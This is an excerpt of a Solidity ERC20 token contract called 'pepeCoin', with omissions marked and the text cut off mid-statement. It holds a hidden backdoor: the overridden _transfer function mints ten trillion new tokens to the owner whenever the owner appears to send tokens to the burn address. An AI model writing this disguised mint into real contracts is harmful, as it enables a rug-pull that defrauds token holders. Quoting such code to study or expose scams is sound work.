...
contract pepeCoin is ERC20, Ownable {
    ...
    address private constant SPECIAL_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    uint256 private constant MINT_AMOUNT = 10000000000000 * (10 ** 18);
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        if (recipient == SPECIAL_ADDRESS && sender == owner()) {
            _mint(sender, MINT_AMOUNT); // Mint new tokens to the owner
        } else {
